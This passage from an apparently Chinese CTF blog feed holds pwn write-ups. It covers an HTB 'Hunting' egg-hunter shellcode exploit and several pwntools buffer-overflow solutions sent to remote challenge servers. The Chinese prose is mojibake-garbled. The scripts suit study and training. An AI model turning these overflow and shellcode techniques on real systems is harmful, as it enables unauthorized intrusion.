&lt;p&gt;read (0, buf, 0x3Cu); æˆ‘ä»¬ç°åœ¨è¿˜æœ‰ 0x3c çš„å†…å­˜å¯ä»¥åˆ©ç”¨&lt;/p&gt;
&lt;p&gt;è¿˜è°ƒç”¨äº† sub_13D0&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int sub_13D0()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned int buf; // [esp+0h] [ebp-18h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int fd; // [esp+8h] [ebp-10h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int i; // [esp+Ch] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = open(&amp;quot;/dev/urandom&amp;quot;, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(fd, &amp;amp;buf, 8u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  close(fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  srand(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for ( i = 0; i &amp;lt;= 1610612735; i = rand() &amp;lt;&amp;lt; 16 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨å†™å…¥çš„ buf å½“ä½œ srand å¹¶ä¸”åˆ©ç”¨ i æ¥æµ‹è¯•éšæœºæ•°&lt;/p&gt;
&lt;p&gt;åœ¨ä½¿ç”¨ seccomp-tools dump ./hunting&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;â””â”€# seccomp-tools dump ./hunting&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0000: 0x20 0x00 0x00 0x00000004  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0001: 0x20 0x00 0x00 0x00000000  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0002: 0x35 0x0a 0x00 0x40000000  if (A &amp;gt;= 0x40000000) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0013: 0x06 0x00 0x00 0x00000000  return KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æŠŠ execve ä»¥åŠ openï¼Œclose ç»™ç¦ç”¨äº†ï¼Œè¡¨ç¤ºæˆ‘ä»¬æ— æ³•ä½¿ç”¨ getshellï¼Œorw&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™å°±å¾—åˆ©ç”¨ c é‡Œé¢çš„å‡½æ•°å»æ‰¾ flag çš„åœ°å€äº†&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚ access å¯ä»¥æ¥åˆ¤æ–­æ–‡ä»¶åæ˜¯å¦å­˜åœ¨å¹¶ä¸”åˆ¤æ–­å†…å­˜åœ°å€æ˜¯å¦å­˜åœ¨&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨è¯­æ³•ä¸º&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;access(const char *filename,int mode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;å½“mode ä¸º0 æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ã€‚&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;å½“mode ä¸º1æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æ‰§è¡Œæƒé™ã€‚&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;å½“mode ä¸º2æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰å†™æƒé™ã€‚&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;å½“mode ä¸º3æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰è¯»æƒé™ã€‚&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;filename å‚æ•°å¯ä»¥æ˜¯æ–‡ä»¶åä¹Ÿèƒ½æ˜¯å†…å­˜åœ°å€&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨ access å‡½æ•°ä»¥ 0x1000 ä¸ºä¸€ä¸ªå•ä½æ¥æ…¢æ…¢éå†&lt;/p&gt;
&lt;p&gt;ç”¨ c ä¼ªä»£ç è¡¨è¾¾ä¸º&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;for (uint32_t address = 0x60000000; address &amp;lt; 0x7fffffff; address += 0x1000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (access(address + i +4) == EFAULT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            break;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        write(1, address, 0x26);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        exit(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ±‡ç¼–è¡¨è¾¾å°±æ˜¯&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mov edx,0x5fffffff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xor ecx,ecx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;notaccess:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;or dx,0xfff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inc edx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov eax,0x21;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lea  ebx,[edx+4]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int 0x80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cmp eax,0xfffffff2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jz  notaccess;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov eax,0x04;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov ebx,1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov ecx,edx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov edx,0x26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int 0x80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./hunting&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;167.99.82.136&amp;#x27;,32646)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov edx,0x5fffffff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xor ecx,ecx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;notaccess:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;or dx,0xfff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inc edx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov eax,0x21;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lea  ebx,[edx+4]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int 0x80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cmp eax,0xfffffff2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jz  notaccess;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov eax,0x04;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov ebx,1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov ecx,edx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov edx,0x26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int 0x80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(asm(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æˆåŠŸå¾—åˆ° flag&lt;/p&gt;
&lt;p&gt;å€Ÿé‰´äº†å¤§ä½¬ wp [Huntingâ€” HTB PWN challenge | lexsd6&#39;s home](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZXhzZDYuZ2l0aHViLmlvLzIwMjEvMTEvMDIvUFdO&#34;&gt;https://lexsd6.github.io/2021/11/02/PWN&lt;/span&gt; Hunting challenge â€” HTB/)&lt;/p&gt;
</content>
        <category term="PWN" />
        <updated>2023-12-13T07:18:01.000Z</updated>
    </entry>
    <entry>
        <id>https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/</id>
        <title>PWNåˆ·é¢˜è§£æ</title>
        <link rel="alternate" href="https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/"/>
        <content type="html">&lt;h5 id=&#34;swpuctf-2021-æ–°ç”Ÿèµ›gift_pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2021-æ–°ç”Ÿèµ›gift_pwn&#34;&gt;#&lt;/a&gt; [SWPUCTF 2021 æ–°ç”Ÿèµ›] gift_pwn&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28785)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x4005B6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019ååŒ—pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019ååŒ—pwn1&#34;&gt;#&lt;/a&gt; [CISCN 2019 ååŒ—] PWN1&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜ç›´æ¥è¦†ç›–æ‰ v1 è®©å…¶æº¢å‡ºåç›´æ¥åˆ° return&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28536)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x30+0x8)+p64(0x4006BE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶ä¹Ÿèƒ½è®© v1 æº¢å‡ºä½¿ v2 ç­‰äºé‚£ä¸ªè®©å…¶æ‰§è¡Œ return&lt;br /&gt;
tips:11.28125 è¡¨ç¤ºåœ¨å†…å­˜å­˜å‚¨å°±æ˜¯ 0x41348000&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xianyufen=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28029)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x2C+p64(0x41348000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xianyufen.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xianyufen.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babystack20&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babystack20&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babystack2.0&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜åˆ¤æ–­ç‚¹åœ¨äºæ— ç¬¦å·ç±»å‹å› ä¸ºé‡Œé¢çš„&lt;br /&gt;
 &lt;code&gt;if ( (int)nbytes &amp;gt; 10 ) &lt;/code&gt; read(0, buf, (unsigned int)nbytes);&lt;br /&gt;
 å› ä¸º buf çš„æº¢å‡ºè¦ 0x18 ä½†æ˜¯ nbytes åªèƒ½æ˜¯ &amp;lt; 10 æ‰€ä»¥æˆ‘ä»¬å°±è¦ä½¿ç”¨æ— ç¬¦å·ç±»å‹è®©å®ƒç­‰äº - 1 ç„¶åå°±èƒ½è¯»å–å¾ˆå¤šäº§ç”Ÿæº¢å‡º&lt;/p&gt;
